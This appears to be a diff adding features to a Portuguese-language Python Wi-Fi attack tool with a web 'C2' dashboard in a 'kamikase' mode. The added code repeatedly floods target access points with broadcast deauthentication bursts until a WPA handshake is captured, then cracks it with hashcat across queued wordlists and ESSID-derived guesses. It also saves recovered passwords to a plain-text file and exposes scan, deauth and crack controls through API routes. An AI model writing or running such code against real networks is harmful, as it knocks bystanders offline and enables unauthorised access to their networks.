+        # 2) Airodump escutando, filtrado pelo BSSID e canal
+        cmd_dump = ["airodump-ng", "--bssid", bssid,
+                    "--channel", str(canal_alvo),
+                    "-w", str(base), "--output-format", "cap",
+                    self.iface]
+        try:
+            p_dump = subprocess.Popen(cmd_dump,
+                                       stdout=subprocess.DEVNULL,
+                                       stderr=subprocess.DEVNULL)
+        except Exception as e:
+            self.ui.error(f"  ✗ airodump-ng não subiu: {e}")
+            return None
+        # Pequena pausa pra airodump registrar canal
+        time.sleep(2.0)
+
+        tentativa = 0
+        try:
+            while True:
+                if stop_event is not None and stop_event.is_set():
+                    self.ui.warn(f"  Captura {bssid} cancelada pelo usuário")
+                    return None
+                tentativa += 1
+                if on_tentativa:
+                    try: on_tentativa(1, tentativa)
+                    except Exception: pass
+                self.ui.info(f"  ↻ {bssid} — burst deauth #{tentativa} (30 pkts) "
+                              f"+ aguardando handshake…")
+                # Burst de 30 deauths broadcast (força todos clientes)
+                try:
+                    subprocess.run(["aireplay-ng", "-0", "30",
+                                     "-a", bssid, self.iface],
+                                    stdout=subprocess.DEVNULL,
+                                    stderr=subprocess.DEVNULL, timeout=20)
+                except Exception:
+                    pass
+                # Aguarda 8s pro cliente reconectar e EAPOL aparecer no cap
+                # — aborta se stop_event sinaliza
+                for _ in range(8):
+                    if stop_event is not None and stop_event.wait(1.0):
+                        return None
+                    elif stop_event is None:
+                        time.sleep(1.0)
+                # Checa se handshake já apareceu
+                if cap_file.exists() and self._cap_tem_handshake(cap_file, bssid):
+                    self.ui.success(f"  ✓ Handshake capturado em {tentativa} "
+                                    f"bursts: {cap_file.name}")
+                    return cap_file
+                if not HANDSHAKE_RETRY_FOREVER and tentativa >= 30:
+                    self.ui.warn(f"  Limite de {tentativa} tentativas atingido")
+                    return None
+        finally:
+            try: p_dump.terminate()
+            except Exception: pass
+            try: p_dump.wait(timeout=3)
+            except Exception:
+                try: p_dump.kill()
+                except Exception: pass
+
+    @staticmethod
+    def _cap_tem_handshake(cap_file: Path, bssid: str) -> bool:
+        """Detecta presença de handshake no .cap. Tenta aircrack-ng (mais
+        confiável), depois scapy contando EAPOL. Idempotente — pode chamar
+        várias vezes durante a captura."""
+        try:
+            tamanho = cap_file.stat().st_size
+        except Exception:
+            return False
+        if tamanho < 1024:
+            return False
+        # Caminho rápido: aircrack-ng lista handshakes encontrados
+        if HAS_AIRCRACK:
+            try:
+                r = subprocess.run(["aircrack-ng", "-a2", "-w", "/dev/null",
+                                     "-b", bssid, str(cap_file)],
+                                    capture_output=True, text=True,
+                                    timeout=8)
+                saida = (r.stdout or "") + (r.stderr or "")
+                # aircrack imprime "X handshake" quando encontra
+                m = re.search(r"(\d+)\s+handshake", saida, re.IGNORECASE)
+                if m and int(m.group(1)) >= 1:
+                    return True
+            except Exception:
+                pass
+        # Fallback scapy: conta frames EAPOL associados ao BSSID
+        if HAS_SCAPY:
+            try:
+                from scapy.all import rdpcap, EAPOL  # type: ignore
+                pkts = rdpcap(str(cap_file))
+                bssid_l = bssid.lower()
+                eapol = 0
+                for p in pkts:
+                    if not p.haslayer(EAPOL):
+                        continue
+                    a1 = (getattr(p, "addr1", "") or "").lower()
+                    a2 = (getattr(p, "addr2", "") or "").lower()
+                    a3 = (getattr(p, "addr3", "") or "").lower()
+                    if bssid_l in (a1, a2, a3):
+                        eapol += 1
+                        if eapol >= 2:
+                            return True
+            except Exception:
+                pass
+        return False
 
 
 # ══════════════════ MEMÓRIA PERSISTENTE ═══════════════════════
@@ -4738,13 +5794,80 @@ class MemoriaPersistente:
         self.salvar()
 
     def registrar_senha(self, bssid: str, senha: str, wordlist: str = ""):
+        """Persiste senha quebrada em memoria/db.json E em Pass/senhas.txt
+        (formato ESSID|BSSID|senha|wordlist|data, separador '|' para evitar
+        colisão com ':' do BSSID, append-only, idempotente)."""
+        essid = ""
         with self.lock:
             ap = self.dados["aps"].get(bssid)
             if ap:
+                essid = ap.get("essid", "") or "?"
                 ap["senha"] = senha
                 ap["quebrada_em"] = datetime.now().isoformat()
                 ap["wordlist_usada"] = wordlist
         self.salvar()
+
+        # ─── Pass/senhas.txt (append idempotente, separador '|') ───
+        try:
+            PASS_DIR.mkdir(parents=True, exist_ok=True)
+            pass_file = PASS_DIR / "senhas.txt"
+            ja_existe = False
+            if pass_file.exists():
+                try:
+                    with pass_file.open("r", encoding="utf-8", errors="ignore") as f:
+                        for linha in f:
+                            partes = linha.strip().split("|")
+                            # ESSID|BSSID|senha|wordlist|data
+                            if len(partes) >= 3 and partes[1] == bssid and partes[2] == senha:
+                                ja_existe = True
+                                break
+                except Exception:
+                    pass
+            if not ja_existe:
+                # Escapa '|' nos campos (evita corromper formato)
+                essid_safe = (essid or "?").replace("|", "_").replace("\n", " ")
+                wl_safe = (wordlist or "?").replace("|", "_").replace("\n", " ")
+                senha_safe = senha.replace("|", "_").replace("\n", " ")
+                linha = f"{essid_safe}|{bssid}|{senha_safe}|{wl_safe}|{datetime.now().isoformat()}\n"
+                with pass_file.open("a", encoding="utf-8") as f:
+                    f.write(linha)
+        except Exception:
+            pass  # não-crítico — db.json é a fonte oficial
+
+    def reaplicar_senhas_em_pass(self) -> int:
+        """Lê todas as senhas de db.json e garante que estão em Pass/senhas.txt.
+        Chamada uma vez no boot do dashboard para sincronizar sessões antigas.
+        Retorna quantidade adicionada."""
+        try:
+            PASS_DIR.mkdir(parents=True, exist_ok=True)
+            pass_file = PASS_DIR / "senhas.txt"
+            existentes = set()
+            if pass_file.exists():
+                with pass_file.open("r", encoding="utf-8", errors="ignore") as f:
+                    for linha in f:
+                        partes = linha.strip().split("|")
+                        if len(partes) >= 3:
+                            existentes.add((partes[1], partes[2]))
+            with self.lock:
+                aps = list(self.dados["aps"].values())
+            adicionadas = 0
+            with pass_file.open("a", encoding="utf-8") as f:
+                for ap in aps:
+                    if not ap.get("senha"):
+                        continue
+                    bssid = ap.get("bssid", "")
+                    senha = ap["senha"]
+                    if (bssid, senha) in existentes:
+                        continue
+                    essid_safe = (ap.get("essid", "?") or "?").replace("|", "_").replace("\n", " ")
+                    wl_safe = (ap.get("wordlist_usada", "?") or "?").replace("|", "_").replace("\n", " ")
+                    senha_safe = senha.replace("|", "_").replace("\n", " ")
+                    quando = ap.get("quebrada_em") or datetime.now().isoformat()
+                    f.write(f"{essid_safe}|{bssid}|{senha_safe}|{wl_safe}|{quando}\n")
+                    adicionadas += 1
+            return adicionadas
+        except Exception:
+            return 0
 
     def registrar_handshake(self, bssid: str, essid: str,
                               path_origem: Path) -> Path:
@@ -4952,6 +6075,9 @@ class HashcatWorker:
         self.thread: Optional[threading.Thread] = None
         self.atual: Optional[Dict[str, Any]] = None
         self.resultados: List[Dict[str, Any]] = []
+        self._cancelar_atual = False
+        self._cancelar_bssids: Set[str] = set()
+        self._wordlist_size_cache: Dict[str, Tuple[float, int]] = {}
 
     def start(self):
         if self.thread and self.thread.is_alive():
@@ -4963,22 +6089,47 @@ class HashcatWorker:
         self.stop_event.set()
 
     def enfileirar(self, bssid: str, essid: str, pcapng: Path, perfil: str = "low",
-                    wordlist: Optional[Path] = None, contextual: bool = True):
+                    wordlist: Optional[Path] = None, wordlists: Optional[List[Path]] = None,
+                    contextual: bool = True, stop_on_crack: bool = True):
+        """Enfileira crack. Suporta wordlist única (legado) ou wordlists (array)."""
+        # Normaliza para lista de wordlists
+        wls = []
+        if wordlists:
+            wls = [str(w) for w in wordlists if w and Path(w).exists()]
+        elif wordlist:
+            wls = [str(wordlist)] if Path(wordlist).exists() else []
         with self.lock:
             self.fila.append({
                 "bssid": bssid, "essid": essid,
                 "pcapng": str(pcapng),
                 "perfil": perfil,
-                "wordlist": str(wordlist) if wordlist else "",
+                "wordlists": wls,  # array de wordlists para fila sequencial
+                "wordlist": wls[0] if wls else "",  # legado compatibilidade
                 "contextual": contextual,
+                "stop_on_crack": stop_on_crack,
                 "status": "queued",
                 "progresso": 0,
                 "eta": "?",
                 "started_at": None,
                 "finished_at": None,
                 "senha": None,
+                "wordlist_atual": None,  # qual wordlist está rodando agora
+                "wordlist_index": 0,  # índice da wordlist atual
+                "wordlist_total": len(wls),
+                "wordlist_progress": 0.0,
+                "global_progress": 0.0,
             })
         emitir("hashcat_queue_update", queue=self._snapshot_fila())
+
+    def cancelar(self, bssid: str):
+        """Cancela o job de um BSSID específico se estiver na fila ou rodando."""
+        with self.lock:
+            # Remove da fila se ainda não iniciou
+            self.fila = [it for it in self.fila if it.get("bssid") != bssid]
+            # Se está rodando agora, marca para parar
+            if self.atual and self.atual.get("bssid") == bssid:
+                self._cancelar_bssids.add(bssid)
+                self._cancelar_atual = True
 
     def _snapshot_fila(self) -> List[Dict[str, Any]]:
         with self.lock:
@@ -5003,7 +6154,7 @@ class HashcatWorker:
         emitir("hashcat_start", item=item)
 
         if not HAS_HASHCAT:
-            item["status"] = "error"
+            item["status"] = "hashcat_missing"
             item["erro"] = "hashcat não instalado"
             emitir("hashcat_done", item=item)
             self.resultados.append(item)
@@ -5018,96 +6169,164 @@ class HashcatWorker:
                 subprocess.run(cmd_conv, timeout=30,
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             if not hash_path.exists() or hash_path.stat().st_size == 0:
-                item["status"] = "error"
+                item["status"] = "convert_failed"
                 item["erro"] = "pcapng sem hash extraível (sem PMKID/EAPOL)"
                 emitir("hashcat_done", item=item)
                 self.resultados.append(item)
                 return
         except Exception as e:
-            item["status"] = "error"
+            item["status"] = "convert_failed"
             item["erro"] = f"hcxpcapngtool falhou: {e}"
             emitir("hashcat_done", item=item)
             self.resultados.append(item)
             return
 
-        # 2) Wordlist — gera versão contextual prepend (500+ variações por ESSID)
-        wordlist_base = item.get("wordlist") or self._wordlist_default()
-        usar_contextual = item.get("contextual", True)  # default ON
-        essid = item.get("essid", "") or ""
-
-        if usar_contextual and essid and essid not in ("<oculto>", "?"):
-            self.ui.info(f"  📚 Gerando wordlist contextual para '{essid}'...")
-            wl_combinada = WordlistContextual.gerar_arquivo(
-                essid, Path(wordlist_base) if wordlist_base else None)
-            wordlist = str(wl_combinada)
-            n_ctx = len(WordlistContextual.gerar_variacoes(essid))
-            item["contextual_count"] = n_ctx
-            item["wordlist_efetiva"] = wl_combinada.name
-            self.ui.success(f"  ✓ {n_ctx} variações contextuais prepended antes da base")
-        else:
-            wordlist = wordlist_base
-
-        if not wordlist or not Path(wordlist).exists():
-            item["status"] = "error"
-            item["erro"] = "Wordlist não encontrada (esperado em ./WordList/)"
+        # 2) Prepara wordlists — array de múltiplas wordlists para fila sequencial
+        wordlists = item.get("wordlists", [])
+        if not wordlists:
+            # Fallback para wordlist única (legado)
+            wl = item.get("wordlist") or self._wordlist_default()
+            if wl:
+                wordlists = [wl]
+        if not wordlists:
+            item["status"] = "wordlist_missing"
+            item["erro"] = "Nenhuma wordlist disponível (esperado em ./WordList/)"
             emitir("hashcat_done", item=item)
             self.resultados.append(item)
             return
 
-        # 3) Roda hashcat com perfil
+        usar_contextual = item.get("contextual", True)
+        stop_on_crack = item.get("stop_on_crack", True)
+        essid = item.get("essid", "") or ""
+
+        # 3) Itera sobre wordlists em sequência até quebrar ou esgotar
         perfil = HASHCAT_PROFILES.get(item.get("perfil", "low"), HASHCAT_PROFILES["low"])
-        cmd = ["hashcat", "-m", "22000",
-               "-w", str(perfil["workload"]),
-               "--status", "--status-timer=2",
-               "--potfile-disable",
-               "-o", str(hash_path) + ".cracked",
-               str(hash_path), wordlist]
-        item["status"] = "running"
-        emitir("hashcat_progress", item=item)
-
-        try:
-            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
-                                     stderr=subprocess.STDOUT, text=True,
-                                     bufsize=1, errors="ignore")
-            for linha in proc.stdout:
-                if self.stop_event.is_set():
-                    proc.terminate()
-                    break
-                # Parse "Progress.........: X/Y (Z%)"
-                m = re.search(r"Progress\.+:\s*\d+/\d+\s*\(([\d.]+)%\)", linha)
-                if m:
-                    try:
-                        item["progresso"] = float(m.group(1))
-                    except ValueError:
-                        pass
-                m = re.search(r"Time\.Estimated\.+:\s*(.+?)\(", linha)
-                if m:
-                    item["eta"] = m.group(1).strip()
-                if "Status" in linha and "Cracked" in linha:
-                    item["status"] = "cracked"
-                emitir("hashcat_progress", item=item)
-            proc.wait(timeout=10)
-        except Exception as e:
-            item["erro"] = str(e)
-
-        # 4) Checa se quebrou
         cracked_path = Path(str(hash_path) + ".cracked")
-        if cracked_path.exists() and cracked_path.stat().st_size > 0:
+        pesos = [self._wordlist_weight(Path(w)) for w in wordlists]
+        peso_total = sum(pesos) or max(1, len(wordlists))
+        peso_concluido = 0.0
+        item["wordlist_total"] = len(wordlists)
+
+        for idx, wordlist in enumerate(wordlists):
+            # Verifica cancelamento
+            if self._cancelar_atual or item["bssid"] in self._cancelar_bssids:
+                self._cancelar_bssids.discard(item["bssid"])
+                self._cancelar_atual = False
+                item["status"] = "cancelled"
+                break
+
+            item["wordlist_index"] = idx
+            item["wordlist_atual"] = Path(wordlist).name
+            item["wordlist_progress"] = 0.0
+            item["progresso"] = round((peso_concluido / peso_total) * 100, 2)
+            item["global_progress"] = item["progresso"]
+            item["eta"] = "?"
+
+            # Gera contextual apenas na primeira wordlist
+            wl_path = Path(wordlist)
+            if idx == 0 and usar_contextual and essid and essid not in ("<oculto>", "?"):
+                self.ui.info(f"  📚 Gerando wordlist contextual para '{essid}'...")
+                try:
+                    wl_combinada = WordlistContextual.gerar_arquivo(essid, wl_path if wl_path.exists() else None)
+                    wl_path = wl_combinada
+                    n_ctx = len(WordlistContextual.gerar_variacoes(essid))
+                    item["contextual_count"] = n_ctx
+                    item["wordlist_efetiva"] = wl_combinada.name
+                    self.ui.success(f"  ✓ {n_ctx} variações contextuais prepended")
+                except Exception as e:
+                    self.ui.warn(f"  Erro ao gerar contextual: {e}")
+
+            if not wl_path.exists():
+                self.ui.warn(f"  Wordlist não encontrada: {wl_path}")
+                continue
+
+            # Roda hashcat com esta wordlist
+            self.ui.info(f"  ▶ Rodando wordlist {idx+1}/{len(wordlists)}: {wl_path.name}")
+            item["status"] = "running"
+            item["wordlist_atual"] = wl_path.name
+            emitir("hashcat_progress", item=item)
+
+            cmd = ["hashcat", "-m", "22000",
+                   "-w", str(perfil["workload"]),
+                   "--status", "--status-timer=2",
+                   "--potfile-disable",
+                   "-o", str(hash_path) + ".cracked",
+                   str(hash_path), str(wl_path)]
+
+            wl_started_at = time.time()
             try:
-                with cracked_path.open("r", errors="ignore") as f:
-                    linhas = [l.strip() for l in f if l.strip()]
-                if linhas:
-                    # Formato: <hash>:<senha> ou só <senha>
-                    senha = linhas[0].split(":")[-1]
-                    item["senha"] = senha
-                    item["status"] = "cracked"
-            except Exception:
-                pass
-        if item["status"] != "cracked":
+                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                         stderr=subprocess.STDOUT, text=True,
+                                         bufsize=1, errors="ignore")
+                for linha in proc.stdout:
+                    if self.stop_event.is_set() or self._cancelar_atual or item["bssid"] in self._cancelar_bssids:
+                        proc.terminate()
+                        break
+                    m = re.search(r"Progress\.+:\s*\d+/\d+\s*\(([\d.]+)%\)", linha)
+                    if m:
+                        try:
+                            atual_pct = float(m.group(1))
+                            item["wordlist_progress"] = atual_pct
+                            item["progresso"] = round(((peso_concluido + (pesos[idx] * atual_pct / 100.0)) / peso_total) * 100, 2)
+                            item["global_progress"] = item["progresso"]
+                        except ValueError:
+                            pass
+                    # B4: ETA com regex tripla + fallback baseado em tempo decorrido
+                    eta_capturado = self._parse_eta(linha)
+                    if eta_capturado:
+                        item["eta"] = eta_capturado
+                    elif item.get("wordlist_progress", 0) > 1.0:
+                        # Fallback: estima baseado em progresso × tempo decorrido
+                        decorrido = time.time() - wl_started_at
+                        pct = item["wordlist_progress"]
+                        if pct > 0:
+                            total_estimado = decorrido * (100.0 / pct)
+                            restante = max(0, total_estimado - decorrido)
+                            item["eta"] = self._formatar_segundos(restante)
+                    if "Status" in linha and "Cracked" in linha:
+                        item["status"] = "cracked"
+                    emitir("hashcat_progress", item=item)
+                proc.wait(timeout=10)
+            except Exception as e:
+                item["erro"] = str(e)
+
+            if self._cancelar_atual or item["bssid"] in self._cancelar_bssids:
+                self._cancelar_bssids.discard(item["bssid"])
+                self._cancelar_atual = False
+                item["status"] = "cancelled"
+                break
+
+            # Checa se quebrou
+            if cracked_path.exists() and cracked_path.stat().st_size > 0:
+                try:
+                    with cracked_path.open("r", errors="ignore") as f:
+                        linhas = [l.strip() for l in f if l.strip()]
+                    if linhas:
+                        senha = linhas[0].split(":")[-1]
+                        item["senha"] = senha
+                        item["status"] = "cracked"
+                        item["wordlist_quebrou"] = wl_path.name
+                        item["wordlist_progress"] = 100.0
+                        item["progresso"] = 100.0
+                        item["global_progress"] = 100.0
+                        break  # Sai do loop de wordlists
+                except Exception:
+                    pass
+
+            # Se quebrou e deve parar, sai do loop
+            if item["status"] == "cracked" and stop_on_crack:
+                break
+            peso_concluido += pesos[idx]
+            item["wordlist_progress"] = 100.0
+            item["progresso"] = round((peso_concluido / peso_total) * 100, 2)
+            item["global_progress"] = item["progresso"]
+
+        if item["status"] != "cracked" and item["status"] != "cancelled":
             item["status"] = "exhausted"
 
         item["finished_at"] = datetime.now().isoformat()
-        item["progresso"] = 100.0 if item["status"] == "cracked" else item.get("progresso", 0)
+        item["progresso"] = 100.0 if item["status"] in ("cracked", "exhausted") else item.get("progresso", 0)
+        item["global_progress"] = item["progresso"]
         # Persiste senha na memória (sobrevive entre sessões)
         if self.memoria and item["status"] == "cracked" and item.get("senha"):
             self.memoria.registrar_senha(
@@ -5121,6 +6340,58 @@ class HashcatWorker:
             return None
         candidatos = sorted(WORDLIST_DIR.glob("*.txt"))
         return str(candidatos[0]) if candidatos else None
+
+    @staticmethod
+    def _parse_eta(linha: str) -> Optional[str]:
+        """B4: regex tripla para ETA do hashcat (compatível com várias versões).
+        Retorna string formatada ou None se não encontrar."""
+        # Formato 1: "Time.Estimated...: <data> (<duracao>)"
+        m = re.search(r"Time\.Estimated\.+:\s*[^\(]+\(([^\)]+)\)", linha)
+        if m:
+            valor = m.group(1).strip()
+            # Hashcat retorna "Next Big Bang" quando ETA é incalculável → mostra "incerto"
+            if "Big Bang" in valor:
+                return "incalculável (chave fora do espaço da wordlist)"
+            return valor
+        # Formato 2: "Time.Estimated...: <data>" (sem parênteses)
+        m = re.search(r"Time\.Estimated\.+:\s*(.+?)$", linha.rstrip())
+        if m:
+            valor = m.group(1).strip()
+            # Filtra valores improváveis (>50 chars = lixo, "Next Big Bang" = nunca)
+            if 1 < len(valor) < 60 and "Big Bang" not in valor:
+                return valor
+        # Formato 3: parênteses standalone com unidade ("(12 secs)")
+        m = re.search(r"\(\s*(\d+\s*(?:secs?|mins?|hours?|days?))\s*\)", linha)
+        if m:
+            return m.group(1).strip()
+        return None
+
+    @staticmethod
+    def _formatar_segundos(segs: float) -> str:
+        """Formata segundos em string humana: '2h 30m', '15m 22s', '45s'."""
+        try:
+            segs = int(segs)
+            if segs < 60:
+                return f"{segs}s"
+            if segs < 3600:
+                return f"{segs // 60}m {segs % 60}s"
+            if segs < 86400:
+                return f"{segs // 3600}h {(segs % 3600) // 60}m"
+            return f"{segs // 86400}d {(segs % 86400) // 3600}h"
+        except Exception:
+            return "?"
+
+    def _wordlist_weight(self, path: Path) -> float:
+        try:
+            stat = path.stat()
+            chave = str(path.resolve())
+            cached = self._wordlist_size_cache.get(chave)
+            if cached == (stat.st_mtime, stat.st_size):
+                return float(stat.st_size or 1)
+            self._wordlist_size_cache[chave] = (stat.st_mtime, stat.st_size)
+            return float(stat.st_size or 1)
+        except Exception:
+            return 1.0
 
 
 # ══════════════════ DASHBOARD C2 LIVE ══════════════════════════
@@ -5219,11 +6490,16 @@ class LiveDashboard:
 
         @app.route("/api/rescan", methods=["POST", "GET"])
         def api_rescan():
-            """Re-escaneia redes WiFi e adiciona só APs novos."""
+            """Re-escaneia redes WiFi e adiciona só APs novos.
+            POST com {"profundo": true} para scan mais intensivo."""
             if not dash.kami_engine:
                 return jsonify({"erro": "engine não inicializado"}), 400
             try:
-                resumo = dash.kami_engine.remapear_redes()
+                profundo = False
+                if flask_request.method == "POST" and flask_request.is_json:
+                    data = flask_request.get_json()
+                    profundo = data.get("profundo", False)
+                resumo = dash.kami_engine.remapear_redes(scan_profundo=profundo)
                 return jsonify(resumo)
             except Exception as e:
                 return jsonify({"erro": str(e)}), 500
@@ -5256,6 +6532,162 @@ class LiveDashboard:
                 dash.kami_engine.memoria.limpar(apagar_handshakes=apagar_hs)
             return jsonify({"ok": True})
 
+        @app.route("/api/exportar", methods=["GET", "POST"])
+        def api_exportar():
+            """Exporta APs da zona escolhida em TXT + PDF para imports/.
+            Query: ?zona=verde|vermelha|azul|todas"""
+            if not dash.kami_engine:
+                return jsonify({"erro": "engine não inicializado"}), 400
+            zona = (flask_request.args.get("zona", "verde") or "verde").lower().strip()
+            if zona not in ("verde", "vermelha", "azul", "todas"):
+                return jsonify({"erro": f"zona inválida: {zona}"}), 400
+            try:
+                eng = dash.kami_engine
+                with eng.zonas_lock:
+                    if zona == "todas":
+                        bssids_alvo = list(set(
+                            eng.zonas["verde"] + eng.zonas["vermelha"] + eng.zonas["azul"]
+                        ))
+                    else:
+                        bssids_alvo = list(eng.zonas.get(zona, []))
+                # Resolve BSSIDs em objetos AP completos (com merge da memória)
+                aps_resolvidos: List[Dict[str, Any]] = []
+                for bssid in bssids_alvo:
+                    runtime = next((a for a in eng.alvos if a.get("bssid") == bssid), {})
+                    persistido = (eng.memoria.obter_ap(bssid)
+                                  if eng.memoria else {}) or {}
+                    # runtime tem dados frescos, persistido tem histórico/senha
+                    mesclado = {**persistido, **runtime}
+                    if mesclado:
+                        aps_resolvidos.append(mesclado)
+                exporter = ZonaExporter(dash.ui)
+                resultado = exporter.exportar(zona, aps_resolvidos)
+                return jsonify(resultado)
+            except Exception as e:
+                dash.ui.error(f"Erro ao exportar zona '{zona}': {e}")
+                return jsonify({"erro": str(e)}), 500
+
+        # ─── SCAN CONTÍNUO DE REDES ───────────────────────────────
+        @app.route("/api/rescan_start", methods=["POST"])
+        def api_rescan_start():
+            """Inicia scan contínuo de redes em background."""
+            if not dash.kami_engine:
+                return jsonify({"erro": "engine não inicializado"}), 400
+            try:
+                profundo = False
+                if flask_request.is_json:
+                    data = flask_request.get_json()
+                    profundo = data.get("profundo", False)
+                dash.kami_engine.iniciar_scan_continuo(profundo=profundo)
+                return jsonify({"status": "iniciado", "modo": "profundo" if profundo else "rápido"})
+            except Exception as e:
+                return jsonify({"erro": str(e)}), 500
+
+        @app.route("/api/rescan_stop", methods=["POST"])
+        def api_rescan_stop():
+            """Para o scan contínuo de redes."""
+            if not dash.kami_engine:
+                return jsonify({"erro": "engine não inicializado"}), 400
+            try:
+                dash.kami_engine.parar_scan_continuo()
+                return jsonify({"status": "parado"})
+            except Exception as e:
+                return jsonify({"erro": str(e)}), 500
+
+        @app.route("/api/scan_scapy", methods=["POST", "GET"])
+        def api_scan_scapy():
+            """Roda um sniff scapy passivo e mescla sem duplicar."""
+            if not dash.kami_engine:
+                return jsonify({"erro": "engine não inicializado"}), 400
+            eng = dash.kami_engine
+            if not HAS_SCAPY:
+                return jsonify({"erro": "scapy não instalado"}), 400
+            try:
+                achados = eng._scan_aps_scapy(timeout_sec=12) or []
+                novos = 0
+                for ap in achados:
+                    try:
+                        merged, criado = eng._adicionar_ou_mesclar_ap(ap)
+                        if criado:
+                            merged.update(WifiSecurityAuditor.auditar(merged))
+                            merged["pacotes"] = merged.get("pacotes", 0)
+                            if eng.memoria:
+                                ap_persistido = eng.memoria.registrar_ap(merged)
+                                merged.update({k: v for k, v in ap_persistido.items()
+                                                if k in ("senha", "quebrada_em", "wordlist_usada",
+                                                          "handshake_path", "handshake_em",
+                                                          "primeiro_visto", "visitas",
+                                                          "historico_zonas")})
+                            with eng.zonas_lock:
+                                if merged["bssid"] not in (eng.zonas["verde"]
+                                                            + eng.zonas["vermelha"]
+                                                            + eng.zonas["azul"]):
+                                    eng.zonas["verde"].append(merged["bssid"])
+                            emitir("ap_descoberto", **merged)
+                            novos += 1
+                        else:
+                            emitir("ap_update", **merged)
+                    except Exception as _e:
+                        dash.ui.warn(f"scapy merge falhou p/ {ap.get('bssid')}: {_e}")
+                total = len(eng.alvos)
+                return jsonify({"ok": True, "novos": novos, "total": total,
+                                  "varridos": len(achados)})
+            except Exception as e:
+                dash.ui.error(f"scan_scapy falhou: {e}")
+                return jsonify({"erro": str(e)}), 500
+
+        @app.route("/api/scan_nmcli", methods=["POST", "GET"])
+        def api_scan_nmcli():
+            """Roda nmcli imediatamente, mescla TUDO sem duplicar e retorna
+            quantos APs novos entraram. Pode ser chamado N vezes seguidas."""
+            if not dash.kami_engine:
+                return jsonify({"erro": "engine não inicializado"}), 400
+            eng = dash.kami_engine
+            try:
+                achados = eng._scan_aps_nmcli(timeout_sec=15) or []
+                novos = 0
+                for ap in achados:
+                    try:
+                        merged, criado = eng._adicionar_ou_mesclar_ap(ap)
+                        if criado:
+                            merged.update(WifiSecurityAuditor.auditar(merged))
+                            merged["pacotes"] = merged.get("pacotes", 0)
+                            if eng.memoria:
+                                ap_persistido = eng.memoria.registrar_ap(merged)
+                                merged.update({k: v for k, v in ap_persistido.items()
+                                                if k in ("senha", "quebrada_em", "wordlist_usada",
+                                                          "handshake_path", "handshake_em",
+                                                          "primeiro_visto", "visitas",
+                                                          "historico_zonas")})
+                            with eng.zonas_lock:
+                                if merged["bssid"] not in (eng.zonas["verde"]
+                                                            + eng.zonas["vermelha"]
+                                                            + eng.zonas["azul"]):
+                                    eng.zonas["verde"].append(merged["bssid"])
+                            emitir("ap_descoberto", **merged)
+                            novos += 1
+                        else:
+                            emitir("ap_update", **merged)
+                    except Exception as _e:
+                        dash.ui.warn(f"nmcli merge falhou p/ {ap.get('bssid')}: {_e}")
+                total = len(eng.alvos)
+                return jsonify({"ok": True, "novos": novos, "total": total,
+                                  "varridos": len(achados)})
+            except Exception as e:
+                dash.ui.error(f"scan_nmcli falhou: {e}")
+                return jsonify({"erro": str(e)}), 500
+
+        @app.route("/api/rescan_exec", methods=["POST"])
+        def api_rescan_exec():
+            """Executa uma iteração do scan (chamado pelo frontend periodicamente)."""
+            if not dash.kami_engine:
+                return jsonify({"erro": "engine não inicializado"}), 400
+            try:
+                resumo = dash.kami_engine.remapear_redes(scan_profundo=False)
+                return jsonify(resumo)
+            except Exception as e:
+                return jsonify({"erro": str(e)}), 500
+
         @sio.on("connect")
         def on_connect():
             sio.emit("estado_inicial", dash.estado)
@@ -5268,14 +6700,56 @@ class LiveDashboard:
             bssid = data.get("bssid")
             destino = data.get("destino")  # 'verde'|'vermelha'|'azul'
             perfil = data.get("perfil", "low")
-            wordlist = data.get("wordlist")
+            # Suporta wordlist (legado) ou wordlists (novo array)
+            wordlists = data.get("wordlists") or data.get("wordlist")
+            if wordlists and not isinstance(wordlists, list):
+                wordlists = [wordlists]
             contextual = data.get("contextual", True)
+            stop_on_crack = data.get("stop_on_crack", True)
             try:
                 dash.kami_engine.mover_para_zona(bssid, destino, perfil=perfil,
-                                                  wordlist=wordlist,
-                                                  contextual=contextual)
+                                                  wordlists=wordlists,
+                                                  contextual=contextual,
+                                                  stop_on_crack=stop_on_crack)
             except Exception as e:
                 dash.ui.warn(f"Erro ao mover {bssid} → {destino}: {e}")
+
+        @sio.on("reset_deauth")
+        def on_reset_deauth(data):
+            """Reinicia deauth para um BSSID específico."""
+            if dash.modo != "kamikase" or not dash.kami_engine:
+                return
+            bssid = data.get("bssid")
+            try:
+                dash.kami_engine.reset_deauth(bssid)
+                dash.ui.info(f"Deauth reiniciado para {bssid}")
+            except Exception as e:
+                dash.ui.warn(f"Erro ao reiniciar deauth para {bssid}: {e}")
+
+        @sio.on("reset_crack")
+        def on_reset_crack(data):
+            """Reinicia crack (e opcionalmente recaptura handshake) para um BSSID."""
+            if dash.modo != "kamikase" or not dash.kami_engine:
+                return
+            bssid = data.get("bssid")
+            recapturar = data.get("recapturar", False)
+            try:
+                dash.kami_engine.reset_crack(bssid, recapturar=recapturar)
+                dash.ui.info(f"Crack reiniciado para {bssid} (recapturar={recapturar})")
+            except Exception as e:
+                dash.ui.warn(f"Erro ao reiniciar crack para {bssid}: {e}")
+
+        @sio.on("recapturar_handshake")
+        def on_recapturar_handshake(data):
+            """Cancela captura em andamento e refaz do zero (zona azul)."""
+            if dash.modo != "kamikase" or not dash.kami_engine:
+                return
+            bssid = data.get("bssid")
+            try:
+                dash.kami_engine.recapturar_handshake(bssid)
+                dash.ui.info(f"🔄 Recaptura iniciada para {bssid}")
+            except Exception as e:
+                dash.ui.warn(f"Erro ao recapturar {bssid}: {e}")
 
 
 # ══════════════════ TEMPLATES HTML ═════════════════════════════
@@ -5616,7 +7090,10 @@ function log(msg, tipo){
   const el = document.getElementById("logfeed");
   const cor = {info:"#5fbcff",ok:"#5fff9f",warn:"#ffe05e",err:"#ff5d77"}[tipo]||"#9ca3af";
   const t = new Date().toLocaleTimeString();
-  el.innerHTML = `<span style="color:${cor}">[${t}]</span> ${msg}\n` + el.innerHTML;
+  let novo = `<span style="color:${cor}">[${t}]</span> ${msg}\n` + el.innerHTML;
+  // B8: cap em 50KB (~300 linhas) para evitar memory leak
+  if(novo.length > 50000) novo = novo.slice(0, 50000);
+  el.innerHTML = novo;
 }
 setInterval(()=>{document.getElementById("timestamp").textContent = new Date().toLocaleTimeString();},1000);
 
@@ -5756,6 +7233,33 @@ TEMPLATE_KAMIKASE = r"""<!doctype html>
   }
   .crystallizing { animation: morph-to-blue 1.5s ease-out forwards; }
 
+  /* F4: animação de VITÓRIA quando senha é quebrada */
